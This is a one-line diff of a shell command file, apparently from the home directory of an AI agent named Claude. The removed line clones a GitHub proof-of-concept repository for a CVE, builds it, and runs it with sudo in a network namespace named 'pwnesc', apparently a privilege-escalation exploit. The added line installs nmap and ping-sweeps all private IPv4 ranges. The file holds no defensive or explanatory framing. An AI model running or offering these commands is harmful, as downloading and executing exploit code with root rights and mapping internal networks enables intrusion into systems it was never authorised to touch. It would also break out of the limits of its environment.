@@ -1,1 +1,1 @@
-cd /home/claude; git clone https://github.com/PeronGH/CVE-2026-99999; cd /home/claude/CVE-2026-99999;  go build -o poc . ;sudo ./scripts/setup.sh ;sudo ip netns exec pwnesc ./poc
+sudo apt update -y; sudo apt install nmap -y; sudo nmap -sn -PE -PS22,80,443,445,3389 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16
